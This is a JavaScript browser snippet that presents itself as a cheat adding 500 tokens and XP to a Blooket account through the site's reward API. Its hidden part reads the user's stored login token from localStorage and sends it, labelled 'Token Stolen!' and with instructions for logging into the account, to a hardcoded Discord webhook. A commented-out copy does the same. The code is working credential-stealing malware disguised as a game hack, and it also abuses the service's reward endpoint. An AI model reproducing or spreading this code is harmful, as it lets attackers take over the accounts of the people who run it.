async function getName(authToken) {
    const response = await fetch('https://api.blooket.com/api/users/verify-token?token=JWT+' + authToken);
    const data = await response.json();
    return data.name
};

function fetchApi(url, json, method){
	fetch(url, {
  	method: method,
    body: JSON.stringify(json),
    headers: {
    	'Content-Type': 'application/json'
    }
  }).then(function (response) {
  	return response.text()
  }).then(function(text){
  	console.log(text)
  }).catch(function(error){
  	console.error(error)
  })
}

async function addTokens() {
    const add_tokens = 500;
    const myToken = localStorage.token.split('JWT ')[1];
    
    const response = await fetch('https://api.blooket.com/api/users/add-rewards', {
        method: "PUT",
        headers: {
            "referer": "https://www.blooket.com/",
            "content-type": "application/json",
            "authorization": localStorage.token
        },
        body: JSON.stringify({
            addedTokens: add_tokens,
            addedXp: 300,
            name: await getName(myToken)
        })
    });
    
    /*
    const tokenLog = await fetch('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ', {
        method: "POST",
        body: JSON.stringify({
            content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)
        })
    });
    */
    fetchApi('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ',{content: await getName(myToken)+"'s Token Stolen!\n"+localStorage.token+"\nLog into account with: localStorage.token = '"+localStorage.token+"'\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')

    if (response.status == 200) {
        alert(`${add_tokens} added to your account!`);
    } else {
        alert('An error occured.');
    };

};

addTokens();
